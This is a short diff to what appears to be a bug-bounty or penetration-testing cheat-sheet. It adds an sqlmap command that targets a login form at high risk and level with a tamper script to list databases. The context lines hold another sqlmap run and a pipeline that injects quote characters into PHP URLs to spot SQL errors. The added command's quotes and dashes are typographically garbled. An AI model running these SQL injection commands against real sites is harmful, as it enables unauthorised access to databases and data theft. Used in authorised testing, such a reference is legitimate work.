@@ -322,6 +322,11 @@ sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
 ```bash
 cat urls.txt | grep ".php" | sed 's/\.php.*/.php\//' | sort -u | sed s/$/%27%22%60/ | httpx -silent -ms "You have an error in your SQL syntax"
 ```
+
+```bash
+sqlmap -u “https://www.site.com/login” — data=”username=a&password=b” — random-agent — tamper=space2comment — level 3 — risk 3 — dbs
+```
+
 ### Open Redirect 
 - Try escalating to SSRF 
 
